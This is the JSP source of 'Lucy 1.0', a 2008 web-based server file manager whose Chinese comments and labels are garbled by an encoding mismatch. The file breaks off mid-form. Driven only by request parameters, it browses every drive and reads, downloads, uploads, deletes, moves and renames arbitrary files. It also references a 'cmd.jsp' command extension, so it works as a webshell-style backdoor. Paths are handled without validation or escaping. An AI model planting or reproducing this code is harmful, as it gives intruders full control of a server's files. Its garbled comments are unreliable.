<%@ page language="java" contentType="text/html;charset=gbk"%>
<%@ page import="java.io.*,
java.text.SimpleDateFormat,
java.util.Vector,
java.net.URLEncoder,
java.util.Arrays;"
%>
<%!
/*-----------------------*\
*    lucy 1.0 release     *
*    PJ produce 2008.2    *
* email:isafile@gmail.com *
\*-----------------------*/
//����
//LUCY, lucy��ҳ������
private static final String LUCY = "index.jsp";
//EDITOR,�ı��༭����ҳ������;
private static final String EDITOR = "editor.jsp";
//VIEWER,Ԥ��ҳ������
private static final String VIEWER = "viewer.jsp";
/*** ������չ��� ***/
//PJ's jspUploadTool,�ϴ���չ���
//PUT_FILENAME,�ϴ���չ�����ҳ������
private static final String PUT_FILENAME = "upload.jsp";
private static final String CMD_FILENAME = "cmd.jsp";
//-----------------��Ҫ�޸Ĵ˺������µ�����-----------------
/*
pj_getDrivers()����������б�,�����ַ���(<a href="...">)
PJ 2008.2
*/
private static String pj_getDrivers(){
StringBuffer drivers=new StringBuffer();
File roots[]=File.listRoots();
for(int i=0;i<roots.length;i++){
drivers.append("<a href='"+LUCY+"?path="+URLEncoder.encode(roots[i].toString())+"'>"+roots[i]+"</a>&nbsp;");
}
return drivers.toString();
}
/*
pj_unicodeToChinese(String s),��iso8859-1ת��Ϊgbk
����s:Ҫת�����ַ���(iso8859-1)
����:ת������ַ���(gbk)
����:(1),���sΪ��,����"",(2)���������ʱ,����sԭ��
PJ 2008.2
*/
private static String pj_unicodeToChinese(String s){
try{
if(s==null||s.equals("")) return "";
String newstring=new String(s.getBytes("ISO8859_1"),"GBK");
return newstring;
}catch(Exception e){return s;}
}
/*
pj_path2link(String path),��·��ת��Ϊ<a href="...">
����path:Ҫת����path�ַ���
����:ת������ַ���(<a href="...">)
PJ 2008.2
*/
private static String pj_path2link(String path) {
File f = new File(path);
StringBuffer buf = new StringBuffer();
String encPath=null;
if(!f.canRead()){
return path;
}else{
while (f.getParentFile() != null) {
encPath = URLEncoder.encode(f.getAbsolutePath());
buf.insert(0,"<a href=\""+LUCY+"?path="+encPath+"\">"+f.getName()+File.separator+"</a>");
f = f.getParentFile();
}
encPath = URLEncoder.encode(f.getAbsolutePath());
buf.insert(0,"<a href=\""+LUCY+"?path="+encPath+"\">"+f.getAbsolutePath()+"</a>");
}
return buf.toString();
}
/*
pj_convertFileSize(long fileSize),��byteΪ��λ���ļ���Сת��windows���ļ���С��ʽ
����fileSize:Ҫת�����ļ���С
����:ת������ַ���,��10KB
PJ 2008.2
*/
private static String pj_convertFileSize(long fileSize) {
String fileSizeOut=null;//size
if(fileSize<1024){
fileSizeOut=fileSize+"byte";
}else if(fileSize>=(1024*1024*1024)){
fileSize=fileSize/(1024*1024*1024);
fileSizeOut=fileSize +"GB";
}else if(fileSize>=(1024*1024)){
fileSize=fileSize/(1024*1024);
fileSizeOut=fileSize +"MB";
}else if(fileSize>=1024){
fileSize=fileSize/1024;
fileSizeOut=fileSize+"KB";
}
return fileSizeOut;
}
/*
expandFileList(String[] files, boolean inclDirs)
��չ�ļ��б�,�Ա����ɾ����Ϊ�յ��ļ���
û���޸Ĵ˷���
*/
private static Vector expandFileList(String[] files, boolean inclDirs) {
	Vector v = new Vector();
	if (files == null) 
		return v;
	for (int i = 0; i < files.length; i++)
	//v.add(new File(URLDecoder.decode(files[i])));
		v.add(new File(files[i]));
	for(int i = 0; i < v.size(); i++) {
		File f = (File) v.get(i);
		if (f.isDirectory()) {
			File[] fs = f.listFiles();
			for (int n = 0; n < fs.length; n++)
				v.add(fs[n]);
			if (!inclDirs) {
				v.remove(i);
				i--;
			}
		}
	}
	return v;
}
/*
pj_delFile(String[] files),ɾ���ļ�
����String[] files:Ҫɾ�����ļ��б�
*files�ַ�����������form�ύ���ַ����б�,����files[]����λ��ͬһĿ¼�µ��ļ�,
*����ô������,����expandFileList()��չ��ÿ���ļ�����ز�λ��,������files[]�������ļ�������������ļ�
����:�ɹ�������ʾ
�쳣����:��
PJ 2008.2
*/
private String pj_delFile(String[] files){
	StringBuffer errorInfo=new StringBuffer();
	String resultInfo="";
	boolean error=false;//�Ƿ���ִ���
	Vector v = expandFileList(files, true);
	int total=0;
	for(int i=v.size()-1;i>=0;i--){
		File f = (File)v.get(i);
		//if (!f.canWrite() || !f.delete()) {
		if (!f.delete()) {
			errorInfo.append("<div class='error'>�޷�ɾ��:["+f.getAbsolutePath()+"]</div>");
			error=true;
			continue;//��������ѭ��
		}
		total++;
	}//end for
	if (error){
		resultInfo=errorInfo.toString()+"<div class='error'>"+total+"���ļ���ɾ��,s�����ļ��޷�ɾ��</div>";
	}else{
		resultInfo="<div class='success'>"+total+"���ļ���ɾ��</div>";
	}
	return (resultInfo);
}
/*
pj_mvFile(String[] files,String newPath),�ƶ��ļ�
����String[] files:Ҫ�ƶ����ļ��б�
����String newPath:Ҫ�ƶ�������λ��
����:�ɹ�������ʾ
�쳣����:NullPointerException(��ָ�����),SecurityException(��ȫ��������ֹ�˴˲���)
PJ 2008.2
*/
private String pj_mvFile(String[] files,String newPath){
	StringBuffer errorInfo=new StringBuffer();
	boolean error=false;//�Ƿ���ִ���
	String sysInfo="";
	String resultInfo="";
	String fileExistsError="";
	File f_old=null;
	File f_new=null;
	try{
		for (int i=0;i<files.length;i++){
			f_old=new File(files[i]);
			if(!newPath.trim().endsWith(File.separator)) 
				newPath=newPath.trim()+File.separator;
			f_new=new File(newPath.trim()+f_old.getName());
			if(!f_old.renameTo(f_new)){
				errorInfo.append("<div class='error'>�޷��ƶ�:["+files[i]+"]��["+newPath+"]</div>");
				error=true;
				continue;//��������forѭ��
			}
		}//end for
	}catch(NullPointerException mvFileNPex){
		sysInfo="<div class='error'>NullPointerException:"+mvFileNPex.getMessage()+"</div>";
		error=true;
	}catch(SecurityException mvFileSFex){
		sysInfo="<div class='error'>SecurityException:"+mvFileSFex.getMessage()+"</div>";
		error=true;
	}
	//error
	if(error){
		resultInfo=errorInfo.toString()+"<div class='error'>�ļ����ƶ���:["+newPath+"]"
		+"<a href='"+LUCY+"?path="+URLEncoder.encode(newPath)+"'>(�������)</a>�����ļ��޷��ƶ�</div>";
	}else{
		resultInfo="<div class='success'>�����ļ����ƶ���:["+newPath+"]"
		+"<a href='"+LUCY+"?path="+URLEncoder.encode(newPath)+"'>(�������)</a></div>";
	}
	return (sysInfo+resultInfo);
}//end function
/*
pj_cpFile(String[] files,String newPath,String path),�����ļ�
����String[] files:Ҫ�ƶ����ļ��б�
����String newPath:Ҫ�ƶ�������λ��
����String path:��ǰλ��
����:�ɹ�������ʾ
�쳣����:
NullPointerException(��ָ�����),
SecurityException(��ȫ��������ֹ�˴˲���),
FileNotFoundException
IOException
PJ 2008.2
*/
private String pj_cpFile(String[] files,String newPath,String path){
	StringBuffer errorInfo=new StringBuffer();
	boolean error=false;//�Ƿ���ִ���
	String sysInfo="";
	String resultInfo="";
	String fileExistsError="";
	boolean success=false;//�Ƿ�ɹ�
	int total=0;
	File f_old=null;
	File f_new=null;
	FileInputStream fis=null;
	FileOutputStream fos=null;
	Vector v = expandFileList(files, true);
	byte buffer[] = new byte[0xffff];
	int b;
	try{
	for(int i=0;i<v.size();i++){
	f_old=(File) v.get(i);
	if(!newPath.trim().endsWith(File.separator)) newPath=newPath.trim()+File.separator;
	f_new=new File(newPath.trim()+f_old.getAbsolutePath().substring(path.length()));
	//������ļ���ֱ�Ӵ���
	if(f_old.isDirectory()){
	f_new.mkdirs();
	total++;
	}else if(f_new.exists()){
	errorInfo.append("���ܸ���["+f_new.getAbsolutePath()+"],�ļ��Ѵ���");
	error=true;
	continue;//��������forѭ��
	}else{
	fis=new FileInputStream(f_old);
	fos=new FileOutputStream(f_new);
	while ((b = fis.read(buffer)) != -1){
	fos.write(buffer,0,b);
	}
	total++;
	}//end else
	}//end for
	if(fis != null) fis.close();
	if(fos != null) fos.close();
	}catch(NullPointerException cpFileNPex){
	sysInfo="<div class='error'>NullPointerException:"+cpFileNPex.getMessage()+"</div>";
	error=true;
	}catch(FileNotFoundException cpFileFNFex){
	sysInfo="<div class='error'>FileNotFoundException:"+cpFileFNFex.getMessage()+"</div>";
	error=true;
	}catch(SecurityException cpFileSFex){
	sysInfo="<div class='error'>SecurityException:"+cpFileSFex.getMessage()+"</div>";
	error=true;
	}catch(IOException cpFileIOex){
	sysInfo="<div class='error'>IOException:"+cpFileIOex.getMessage()+"</div>";
	error=true;
	}
	//error
	if(error){
	resultInfo=errorInfo.toString()+"<div class='error'>"+total+"���ļ��Ѹ��Ƶ�:["+newPath+"]"
	+"<a href='"+LUCY+"?path="+URLEncoder.encode(newPath)+"'>(�������)</a>�����ļ��޷�����</div>";
	}else{
	resultInfo="<div class='success'>"+total+"���ļ��Ѹ��Ƶ�:["+newPath+"]"
	+"<a href='"+LUCY+"?path="+URLEncoder.encode(newPath)+"'>(�������)</a></div>";
	}
	return (sysInfo+resultInfo);
}
/*
pj_crFolder(String path,String name),�����ļ���
����String path:Ҫ�����ļ��е�λ��
����String name:Ҫ�����ļ��е�����
����:�ɹ�������ʾ,���ļ��Ѵ�����ʾ
�쳣����:
NullPointerException(��ָ�����),File crfolderFile=new File(crPath)�׳�
SecurityException(��ȫ��������ֹ�˴˲���),mkdir(),exists()�׳�
PJ 2008.2
*/
private String pj_crFolder(String path,String name){
String sysInfo="";
String resultInfo="";
String fileExistsError="";
boolean success=false;//�Ƿ�ɹ�
if(!path.trim().endsWith(File.separator)) path=path.trim()+File.separator;
String crPath=path.trim()+name;
try{
File crfolderFile=new File(crPath);
if(crfolderFile.exists()){
fileExistsError="�ļ����Ѵ���";
}else{
success=crfolderFile.mkdir();//��������ɹ�����true
}
}catch(NullPointerException crFolderNPex){
sysInfo="<div class='error'>NullPointerException:"+crFolderNPex.getMessage()+"</div>";
success=false;
}catch(SecurityException crFolderSFex){
sysInfo="<div class='error'>SecurityException:"+crFolderSFex.getMessage()+"</div>";
success=false;
}
//error
if(success){resultInfo="<div class='success'>1���ļ����Ѵ���:["+crPath+"]</div>";}
else{resultInfo ="<div class='error'>0���ļ����Ѵ���,���ܴ���:["+crPath+"]."+fileExistsError+"</div>";}
return (sysInfo+resultInfo);
}//end function
/*
pj_crFile(String path,String name),�����ļ�
����String path:Ҫ�����ļ���λ��
����String name:Ҫ�����ļ�������
����:�ɹ�������ʾ,���ļ��Ѵ�����ʾ
�쳣����:
NullPointerException(��ָ�����),File crfolderFile=new File(crPath)�׳�
SecurityException(��ȫ��������ֹ�˴˲���),createNewFile(),exists()�׳�
PJ 2008.2
*/
private String pj_crFile(String path,String name){
String sysInfo="";
String resultInfo="";
String fileExistsError="";
boolean success=false;//�Ƿ�ɹ�
if(!path.trim().endsWith(File.separator)) path=path+File.separator;
String crPath=path+name;
try{
File crfileFile=new File(crPath);
if(crfileFile.exists()){
fileExistsError="�ļ��Ѵ���";
}else{
success=crfileFile.createNewFile();//��������ɹ�����true
}
}catch(NullPointerException crFileNPex){
sysInfo="<div class='error'>NullPointerException:"+crFileNPex.getMessage()+"</div>";
success=false;
}catch(IOException crFileIOex){
sysInfo="<div class='error'>IOException:"+crFileIOex.getMessage()+"</div>";
success=false;
}catch(SecurityException crFileSFex){
sysInfo="<div class='error'>SecurityException:"+crFileSFex.getMessage()+"</div>";
success=false;
}
//error
if(success){resultInfo="<div class='success'>1���ļ��Ѵ���:["+crPath+"]</div>";}
else{resultInfo ="<div class='error'>0���ļ��Ѵ���,���ܴ���:["+crPath+"]."+fileExistsError+"</div>";}
return (sysInfo+resultInfo);
}//end function
/*
pj_reName(String path,String oldFileName,String newFileName),�������ļ�
����String path:Ҫ��ǰλ��
����String oldFileName:���ļ���
����String newFileName:���ļ���
����:�ɹ�������ʾ,���ļ��Ѵ�����ʾ
�쳣����:
NullPointerException(��ָ�����),
File f_old=new File(path+oldFileName);
File f_new=new File(path+newFileName);�׳�
SecurityException(��ȫ��������ֹ�˴˲���),renameTo(),exists()�׳�
PJ 2008.2
*/
private String pj_reName(String path,String oldFileName,String newFileName){
String sysInfo="";
String resultInfo="";
String fileExistsError="";
boolean success=false;//�Ƿ�ɹ�
if(!path.trim().endsWith(File.separator)) path=path+File.separator;
try{
File f_old=new File(path+oldFileName);
File f_new=new File(path+newFileName);
//������ļ�������
if(f_new.exists()){
fileExistsError="�ļ����ļ����Ѵ���";
}else{success=f_old.renameTo(f_new);}
}catch(NullPointerException cnFileNPex){
sysInfo="<div class='error'>NullPointerException:"+cnFileNPex.getMessage()+"</div>";
success=false;
}catch(SecurityException cnFileSFex){
sysInfo="<div class='error'>SecurityException:"+cnFileSFex.getMessage()+"</div>";
success=false;
}
if(success){resultInfo="<div class='success'>["+oldFileName+"]��������Ϊ:["+newFileName+"]</div>";}
else{resultInfo ="<div class='error'>����������["+oldFileName+"]Ϊ["+newFileName+"]."+fileExistsError+"</div>";}
return (sysInfo+resultInfo);
}
/*
getReqValue(String s,String reqName),���ڽ����ϴ��ļ�ʱ,���ͷ��ĳ������ֵ
ԭ����ͨ���Ȳ�������˫����������м��ֵ
s=�ַ���
reqName=Ҫ���ҵ��ļ�ͷ�ַ���,��filename
getReqValue("filename=\"C:\\Documents and Settings\\jun\\����\\mainwindowb4\\table_all.txt\"","filename")
PJ 2008.2
*/
private String getReqValue(String s,String reqName){
String reqValue = null; //�������ֵ,�����ش�ֵ
int reqNameStartIndex = -1; //�����������ʼ���ֳ��ֵ�λ��,��filename="����ĸf���ֵ�λ��
int reqValueStartIndex = -1;//��ʼ"���ֵ�λ��
int reqValueEndIndex = -1;//���"���ֵ�λ��
reqName = reqName + "=" + "\"";//reqName=reqName���ϵȺź�˫���ż����filename="
reqNameStartIndex = s.indexOf(reqName);//����filename="��λ��
if(reqNameStartIndex > -1){//�������filename="
reqValueStartIndex = reqNameStartIndex + reqName.length();//reqֵ�Ŀ�ʼλ��=req����������λ��+req��������
reqValueEndIndex = s.indexOf("\"",reqValueStartIndex);//�Ӳ���ֵ��ʼ����\"��ʼ����������һ��\"
  if(reqValueStartIndex > -1 && reqValueEndIndex > -1){ //����������ֵ�п�ʼ�н�β,��������˫���Ŷ���
    reqValue = s.substring(reqValueStartIndex,reqValueEndIndex);//�������˫����֮�������
  }
}
return reqValue;//����reqValue
}
%>
<% 
request.setCharacterEncoding("gbk");
response.setHeader("Pragma","No-cache");//HTTP 1.1
response.setHeader("Cache-Control","no-cache");//HTTP 1.0
response.setHeader("Expires","0");//��ֹ��proxy
%>
<html>
<head>
<title>Lucy 1.0</title>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<link type="text/css" rel="StyleSheet" href="face.css" />
</head><body>
<jsp:include page="extools/login.jsp" />
<span id="title">Lucy 1.0 release</span>
<div id="about">
<a href='#' onClick="about();">����</a>&nbsp;|&nbsp;<a href='help.html' target="_blank">����</a>
</div>
<hr>
<%
String resultInfo="";
String URLpath=null;
String path=request.getParameter("path");
boolean error=false;
//if path==null
if(path==null||path.length()<1){
path=request.getRealPath("/");
//path=application.getRealPath(".");
}
//path=URLDecoder.decode();
path=pj_unicodeToChinese(path);
if(request.getParameter("errorPath")!=null){
path=request.getParameter("errorPath");
}
//download
if (request.getParameter("download") != null) {
String filePath = request.getParameter("download");
filePath=pj_unicodeToChinese(filePath);
File file=null;
FileInputStream fis=null;
BufferedOutputStream os=null;
try{
file = new File(filePath);
fis = new FileInputStream(file); 
os = new BufferedOutputStream(response.getOutputStream());
fis = new java.io.FileInputStream(filePath); 
response.setContentType("application/octet-stream");
response.setContentLength((int)file.length()); 
response.setHeader("Content-Disposition","attachment; filename=\""+new String(file.getName().getBytes("GBK"),"iso8859-1")+"\"");
byte[] buff=new byte[1024*10];
int i = 0; 
while( (i = fis.read(buff)) > 0 ){ 
os.write(buff, 0, i); 
}
fis.close(); 
os.flush(); 
os.close(); 
}catch(Exception ex){
out.print("<div class='error'>"+new String(ex.getMessage())+"</div>");
if(fis != null)fis.close(); 
if(os != null)os.close(); 
}
}//end
//delete files
else if((request.getParameter("submit")!= null)&&(request.getParameter("submit").equals("Delete"))){
String[] files=request.getParameterValues("selfile");
path=request.getParameter("path");//���path��POST�������Ͳ�Ҫ������
if(files==null || files.length<1){
out.print("<div class='error'>û��ѡ���κ��ļ�</div>");
}else{
resultInfo=pj_delFile(files);
out.print(resultInfo);
}
}//end
// Move selected file(s)
else if((request.getParameter("submit")!=null)&&(request.getParameter("submit").equals("MoveFile"))){
String mvFilePath=request.getParameter("mvFilePath");
String[] files=request.getParameterValues("selfile");
if(files==null || files.length<1){
out.print("<div class='error'>û��ѡ���κ��ļ�</div>");
}else if(mvFilePath==null || mvFilePath.length()<1){
out.print("<div class='error'>û�л���ƶ�����·��</div>");
}else{
resultInfo=pj_mvFile(files,mvFilePath);
out.print(resultInfo);
}
}//end
//Copy selected file(s)
else if((request.getParameter("submit")!=null)&&(request.getParameter("submit").equals("CopyFile"))){
String cpFilePath=request.getParameter("cpFilePath");
String[] files=request.getParameterValues("selfile");
if(files==null || files.length<1){
out.print("<div class='error'>û��ѡ���κ��ļ�</div>");
}else if(cpFilePath==null || cpFilePath.length()<1){
out.print("<div class='error'>û�л�ø��Ƶ���·��</div>");
}else{
resultInfo=pj_cpFile(files,cpFilePath,path);
out.print(resultInfo);
}
}//end
//Create folder
else if((request.getParameter("submit")!=null)&&(request.getParameter("submit").equals("CreateFolder"))){
String crFolderName=request.getParameter("crFolderName");
path=request.getParameter("path");//���path��POST�������Ͳ�Ҫ������
String info=null;
if(path==null || path.length()<1){
out.print("<div class='error'>û�л�õ�ǰ·��</div>");
}else if(crFolderName==null || crFolderName.length()<1){
out.print("<div class='error'>û�л�ô����ļ��е�����</div>");
}else{
resultInfo=pj_crFolder(path,crFolderName);
out.print(resultInfo);
}
}//end
//Create file
else if((request.getParameter("submit")!=null)&&(request.getParameter("submit").equals("CreateFile"))){
String crFileName=request.getParameter("crFileName");
path=request.getParameter("path");//���path��POST�������Ͳ�Ҫ������
String crFilePath=path+File.separator+crFileName;
if(path==null || path.length()<1){
out.print("<div class='error'>û�л�õ�ǰ·��</div>");
}else if(crFileName==null || crFileName.length()<1){
out.print("<div class='error'>û�л�ô����ļ�������</div>");
}else{
resultInfo=pj_crFile(path,crFileName);
out.print(resultInfo);
}
}//end
//rename
else if((request.getParameter("submit")!=null)&&(request.getParameter("submit").equals("Rename"))){
String oldFileName=request.getParameter("oldFileName");
String newFileName=request.getParameter("newFileName");
path=request.getParameter("path");//���path��POST�������Ͳ�Ҫ������
if(path==null || path.length()<1){
out.print("<div class='error'>û�л�õ�ǰ·��</div>");
}else if(oldFileName ==null || oldFileName .length()<1){
out.print("<div class='error'>���ȵ���ļ��ұߵ�\"������\"����</div>");
}else if(newFileName ==null || newFileName .length()<1){
out.print("<div class='error'>û�л���ļ���������</div>");
}else{
resultInfo=pj_reName(path,oldFileName,newFileName);
out.print(resultInfo);
}
}//end
//upload file
else if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart"))){
//if(request.getContentLength()>(1024*1024)){
//out.print("<div class='error'>�����ϴ�size����1MB</div>");
//}else{
File ff=null;
FileOutputStream ffos=null;
int l=0,l2=0;
int startlineLength=0;//�߽������
long filesize=0;
byte[] buffout=new byte[1024*10];
byte[] buff=new byte[1024*10];
String savepathname=null;
String fileName=null;//�ļ���
String startline=null;//��һ��
String filenameline=null;//�ļ�����(�ڶ���)
String endline=null;//���һ��
String middleline=null;//�м���
String exInfo="";
boolean issuccess=false;
boolean isEnd=false;
ServletInputStream sis=null;
try{
sis=request.getInputStream();
//����1��
startlineLength=sis.readLine(buff,0,buff.length);
//�����һ��<3
if(startlineLength<3){
out.print("<div class='error'>��ȡ��һ�д���</div>");
}else{
startline=new String(buff,0,startlineLength-2);//�õ���һ����Ϊ��β�е�����
endline=startline+"--";//��β�бȵ�һ�ж�"--"
//����2��
l=sis.readLine(buff,0,buff.length);
filenameline=new String(buff,0,l);//�õ��ڶ�����Ϊ�ļ���������
if(filenameline.indexOf("filename=\"")==-1){
out.print("<div class='error'>û�з���httpͷ�Ĳ���filename</div>");
}else{
filenameline=getReqValue(filenameline,"filename");
fileName=filenameline.substring(filenameline.lastIndexOf(File.separator)+1);
//fileName=getFileName(filenameline);
if(fileName==null || fileName.length()<1 ){out.print("<div class='error'>û�з���Ҫ�ϴ��ļ����ļ���</div>");}
else{
if(!path.endsWith(File.separator)){path=path+File.separator;}
savepathname=path+fileName;
ff = new File(savepathname); 
//����ļ��Ѿ�����
if(ff.exists()){
sis.close();
out.print("<div class='error'>�����ϴ�����·��:["+savepathname+"],�ļ��Ѵ���</div>");
}else{
l=sis.readLine(buff,0,buff.length);//����3��
l=sis.readLine(buff,0,buff.length);//����4��(����)
ffos=new FileOutputStream(ff);
l2=sis.readLine(buffout,0,buffout.length);//��ȡ���ݵ�һ�з����������
//��������
while((l=sis.readLine(buff,0,buff.length))!=-1){
//�ж��Ƿ����һ��,�Ƚϳ��ȱȱȽ��ַ���ʹ�ø�С��ϵͳ����
if(l==(startlineLength+2) || l==(startlineLength+2)){
middleline=new String(buff,0,l);
if(middleline.startsWith(endline)){isEnd=true;}
}
if(isEnd){ffos.write(buffout,0,l2-2);break;}
else{
ffos.write(buffout,0,l2);
for(int i=0;i<buff.length;i++){
buffout[i]=buff[i];
}
l2=l;
}
}//while�Ľ�β
filesize=ff.length();
out.print("<div class='success'>1���ļ����ϴ�:["+savepathname+"],size:["+pj_convertFileSize(filesize)+"("+filesize+"�ֽ�)]</div>");
}//else
}//else
}//else
}//else
}catch(Exception ulex){
out.print("<div class='error'>Exception:"+ulex.getMessage()+"</div>");
}
//�ر���
if(ffos!=null){
ffos.flush();
ffos.close();
}
if(sis!=null) sis.close();
//}//else
}//else

//start view filelist
int objFileError=0;
File objFile=new File(path);
URLpath=URLEncoder.encode(path);
String fileAbsolutePath=null;
String encodeFileAbsolutePath=null;
%>
<script type="text/javascript" src="hands.js"></script>
<table width="100%" cellpadding="0" cellspacing="0">
<tr><td colspan="2">������:<%=pj_getDrivers()%></td></tr>
<tr><td colspan="2">��ǰ·��:<%=pj_path2link(path)%><br></td></tr>
<tr><td>
<%
if(objFile.getParent()==null){out.print("<a href='#' disabled>�������Ŀ¼</a> |");}
else{out.print("<a href='"+LUCY+"?path="+URLEncoder.encode(objFile.getParent())+"'>��һ��Ŀ¼</a>  |");}
SimpleDateFormat formatter = new SimpleDateFormat("yyyy-M-d H:mm");
int a=0,b=0;
%>
<a href='#' onClick="history.go(-1);">����</a> |
<a href='#' onClick="history.go(1);">ǰ��</a> |
<a href="<%=LUCY%>?path=<%=URLpath%>">ˢ��</a> |
<a href="<%=LUCY%>">Home</a>
</td><td align="right">
Filename filter:<input name="filt" type="text" class="text" onkeyup="filter(this);">
</td></tr>
</table>
<form action="<%=LUCY%>" method="POST" name="FileList">
<div style="background-color:#DEDEDE">
<table width="100%" cellpadding="1" cellspacing="1" id="Filetable">
<thead>
<tr bgcolor="#CCCCCC">
<td width="2%" align="center"><input name="selall" type="checkbox" onClick="selectAll(this.form);" class="checkbox"></td>
<td width="49%">Name:</td><td width="9%">Size:</td><td width="17%">Last modified:</td>
<td width="5%">Edit:</td><td width="8%">Rename:</td><td width="10%">DownLoad:</td>
</tr>
</thead>
<tbody>
<%
File fileList[]=objFile.listFiles();
if(fileList!=null) Arrays.sort(fileList);
if(fileList==null){
out.print("<tr><td colspan='7' bgcolor='#FFA2A2'>·���������������,���²��ܴ����ļ��б�<br>�����ֶ������·��:");
out.print("<form action="+LUCY+" method='post'><input type='text' name='errorPath' size='50' class='text'>&nbsp;");
out.print("<input type='submit' value='submit' class='button2'></form></td></tr></table></div>");
}else{
for(int i=0;i<fileList.length;i++){
if(fileList[i].isDirectory()){ 
a++;
fileAbsolutePath=fileList[i].getAbsolutePath();
encodeFileAbsolutePath=URLEncoder.encode(fileAbsolutePath);
%>
<tr style="background-color:#FFFFFF" onMouseOver="selectRow(this,0);" onMouseOut="selectRow(this,1);" onmouseup="selectRow(this,2);">
<td align="center">
<input type="checkbox" name="selfile" value="<%=fileAbsolutePath%>" onmousedown="dis();" class="checkbox">
</td><td>
<img src='folder.gif' align="absmiddle" style="margin-left:4px;">
<a href="<%=LUCY%>?path=<%=encodeFileAbsolutePath%>" onmousedown="dis();">
<%=fileList[i].getName()%></a></td>
<td>folder</td>
<td><%=formatter.format(fileList[i].lastModified())%></td>
<td>-</td>
<td><a href="#tool" onmousedown="dis();" onClick="showDivValue('Div_rename','<%=fileList[i].getName()%>');">rename</a></td>
<td>-</td>
</tr>
<%
}//end if
}//end for
for(int i=0;i<fileList.length;i++){
if(fileList[i].isFile()){ 
b++;
fileAbsolutePath=fileList[i].getAbsolutePath();
encodeFileAbsolutePath=URLEncoder.encode(fileAbsolutePath);
%>
<tr style="background-color:#FFFFFF" onMouseOver="selectRow(this,0);" onMouseOut="selectRow(this,1);" onmouseup="selectRow(this,2);">
<td align="center">
<input type="checkbox" name="selfile" value="<%=fileAbsolutePath%>" onmousedown="dis();" class="checkbox">
</td><td>
<img src='file.gif' align="absmiddle" style="margin-left:4px;">
<a href="<%=VIEWER%>?path=<%=encodeFileAbsolutePath%>" onmousedown="dis();" target="_blank">
<%=fileList[i].getName()%></a></td>
<td><%=pj_convertFileSize(fileList[i].length())%></td>
<td><%=formatter.format(fileList[i].lastModified())%></td>
<td><a href="<%=EDITOR%>?path=<%=encodeFileAbsolutePath%>" onmousedown="dis();" target="_blank">edit</a></td>
<td><a href="#tool" onmousedown="dis();" onClick="showDivValue('Div_rename','<%=fileList[i].getName()%>');">rename</a></td>
<td>
<a href="<%=LUCY%>?download=<%=encodeFileAbsolutePath%>" onmousedown="dis();">
download
</a>
</td></tr>
<%
}//end if
}//end for
%>
</tbody></table></div>
<%
}
%>
<div style="background-color:#CCCCCC;">
Total:
<img src='folder.gif' align="absmiddle">:<%=a%>,
<img src='file.gif' align="absmiddle">:<%=b%>
(Fliteration result:
<img src='folder.gif' align="absmiddle">:<span id="folderTotal"><%=a%></span>,
<img src='file.gif' align="absmiddle">:<span id="fileTotal"><%=b%></span>)
</div><br>
<a name="tool"></a>
<b style="color:#666666">����ѡ�е��ļ�:</b><br>
<input type="hidden" name="path" value="<%=path%>">
<span id="Div_movefile_span">
<a href="#tool" onclick="javascript:showDiv('Div_movefile');">Move</a> 
</span>|<span id="Div_copyfile_span">
<a href="#tool" onclick="javascript:showDiv('Div_copyfile');">Copy</a> 
</span>|<span id="Div_deletefile_span">
<a href="#tool" onclick="javascript:showDiv('Div_deletefile');">Delete</a>
</span>|<span>
<a href="#tool" onclick="javascript:disableAll();">Hide ToolList</a>
</span>
<!--Move File-->
<div id="Div_movefile" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>�ƶ��ļ�(Move File)</b><br>
�ƶ�ѡ�е��ļ�������д��Ŀ��·����<br>
�������ƶ���Ŀ��·��(�� "c:\abc\"):<br>
<input type="text" name="mvFilePath" size="90" class="text"><br>
<input type="submit" name="submit" value="MoveFile" class="button2">
<hr></div>
<!---->
<!--Copy File-->
<div id="Div_copyfile" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>�����ļ�(Copy File)</b><br>
����ѡ�е��ļ�������д��Ŀ��·����<br>
�����븴�Ƶ�Ŀ��·��(�� "c:\abc\"):<br>
<input type="text" name="cpFilePath" size="90" class="text"><br>
<input type="submit" name="submit" value="CopyFile" class="button2">
<hr></div>
<!---->
<!--Delete File-->
<div id="Div_deletefile" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>ɾ���ļ�(Delete File)</b><br>
����һ��Σ�յĲ���,�ļ�һ����ɾ���Ͳ��ָܻ���<br>
ǿ�ҽ��������¼��һ��ѡ�е��ļ�,����ʹ������������ɾ��.<br>
�����ȷ��Ҫ��ô��,������水ť,ѡ�е��ļ���������ɾ��.<br>
<input type="submit" name="submit" class="button2" value="Delete" onclick="return confirm('��ȷ��Ҫɾ����Щ�ļ�?')">
<hr></div>
<!---->
</form>
<div style="margin-top:3px;color:#666666;"><b>������ǰĿ¼:</b></div>
<span id="Div_upload_span">
<a href="#tool" onclick="javascript:showDiv('Div_upload');">Upload</a>
</span>|<span id="Div_newfolder_span">
<a href="#tool" onclick="javascript:showDiv('Div_newfolder');">Create Folder</a>
</span>|<span id="Div_newfile_span">
<a href="#tool" onclick="javascript:showDiv('Div_newfile');">Create File</a>
</span>|<span id="Div_rename_span">
<a href="#tool" onclick="javascript:showDiv('Div_rename');">Rename</a>
</span>|<span id="Div_extension_span">
<a href="#tool" onclick="javascript:showDiv('Div_extension');">Extensions</a>
</span>
<!--upload-->
<div id="Div_upload" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>�ϴ��ļ�(Upload)</b><br>
�㽫�ϴ�һ���ļ���:<font color=red><%=path%></font><br>
<form method="POST" action="<%=LUCY%>?path=<%=URLEncoder.encode(path)%>" enctype="multipart/form-data">
<input type="file" name="upfile" size="50" class="text"><br>
<input type="submit" value="Upload" class="button2">
</form>
<hr></div>
<!---->
<!--Create Folder-->
<div id="Div_newfolder" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>����һ�����ļ���(Create Folder)</b><br>
�㽫����һ�����ļ�����:<font color=red><%=path%></font><br>
<form method="POST" action="<%=LUCY%>">
<input type="hidden" name="path" value="<%=path%>">
please enter���ļ��е�����:(��Ҫ���� \ / : * ? " < > |)<br>
<input type="text" name="crFolderName" size="50" class="text"><br>
<input type="submit" name="submit" value="CreateFolder" class="button2">
</form>
<hr></div>
<!---->
<!--Create File-->
<div id="Div_newfile" style="display:none;margin-top:3px;LETTER-SPACING:0px">
<b>����һ�����ļ�(Create File)</b><br>
�㽫����һ�����ļ���:<font color=red><%=path%></font><br>
<form method="POST" action="<%=LUCY%>">
<input type="hidden" name="path" value="<%=path%>">
